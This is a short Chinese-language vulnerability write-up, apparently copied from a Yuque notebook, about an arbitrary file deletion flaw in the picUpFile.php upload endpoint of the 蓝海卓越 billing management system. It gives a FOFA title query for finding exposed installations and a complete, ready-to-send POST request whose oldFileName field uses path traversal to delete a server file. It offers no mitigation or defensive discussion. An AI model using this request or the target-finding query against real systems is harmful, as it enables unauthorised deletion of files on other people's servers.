# 蓝海卓越 计费管理系统picUpLoad存在任意文件删除漏洞

# 一、漏洞简介
蓝海卓越 计费管理系统picUpLoad存在任意文件删除漏洞

# 二、影响版本
+ 蓝海卓越 计费管理系统

# 三、资产测绘
+ fofa`title=="蓝海卓越计费管理系统"`
+ 特征

![1716136162798-aa34ed6f-ea20-43f2-99a7-dba6a1e626c9.png](./img/oXQ_3ojiaYdjzEDT/1716136162798-aa34ed6f-ea20-43f2-99a7-dba6a1e626c9-714250.png)

# 四、漏洞复现
```plain
POST /inc/picUpFile.php?upFileFoler=&upFileID=&viewID= HTTP/1.1
Host: 
Content-Length: 1447494
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryehA9evlvumScbjSw
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 SE 2.X MetaSr 1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=lp91fvnja6f987dj7jmkjh5601
Connection: close

------WebKitFormBoundaryehA9evlvumScbjSw
Content-Disposition: form-data; name="oldFileName"

../../../../../usr/local/usr-gui/test.php
------WebKitFormBoundaryehA9evlvumScbjSw
Content-Disposition: form-data; name="file"; filename="c.jpg"
Content-Type: image/jpeg

PNG


```

删除前

![1716390398206-8c468003-c696-4598-8722-1bf12f77f597.png](./img/oXQ_3ojiaYdjzEDT/1716390398206-8c468003-c696-4598-8722-1bf12f77f597-977713.png)

![1716390672971-2ed1b251-e00c-421c-8d55-b9d57b0387b5.png](./img/oXQ_3ojiaYdjzEDT/1716390672971-2ed1b251-e00c-421c-8d55-b9d57b0387b5-466649.png)

删除后

![1716390648320-9877848d-e0e0-4eb9-8161-04ed283e68ab.png](./img/oXQ_3ojiaYdjzEDT/1716390648320-9877848d-e0e0-4eb9-8161-04ed283e68ab-968201.png)



> 更新: 2024-05-23 12:33:24  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mcsdegx6gomcebd8>